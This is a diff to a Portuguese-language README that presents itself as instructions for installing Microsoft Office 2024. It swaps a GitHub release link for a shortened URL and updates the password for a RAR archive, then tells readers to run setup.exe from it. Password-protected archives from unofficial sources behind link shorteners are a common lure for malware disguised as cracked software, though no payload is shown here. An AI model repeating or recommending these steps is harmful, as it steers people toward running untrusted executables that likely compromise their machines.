@@ -2,8 +2,8 @@
 
 <H3>⚙️ Como instalar o Microsoft Office 2024</H3>
 
-- [Download](https://github.com/timeosilly/microsoft-office-2024-portugal/releases/download/Download/MO24.rar)
-- Abra o arquivo (senha: Office24)
+- [Download](https://goo.su/cUUmblp)
+- Abra o arquivo (senha: Project12!)
 - Abra setup.exe para baixar componentes e instalar
 - Siga as instruções
 
